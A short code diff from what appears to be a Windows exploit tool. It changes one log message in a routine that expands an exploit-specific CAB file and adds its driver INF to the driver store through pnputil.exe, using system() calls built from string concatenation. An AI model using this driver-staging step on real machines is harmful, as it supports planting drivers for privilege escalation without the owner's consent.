@@ -119,7 +119,7 @@ namespace
 		std::cout << "[+] Expanding " << cab_file << std::endl;
 		system(std::string("expand -F:* " + cab_file + " tmp > null").c_str());
 
-		std::cout << "[+] Pushing into the data store" << std::endl;
+		std::cout << "[+] Pushing into the driver store" << std::endl;
 		std::string cab_inf = ".\\tmp\\" + s_exploits[p_exploitName].inf_path;
 		system(std::string("pnputil.exe /add-driver " + cab_inf + " > nul").c_str());
 
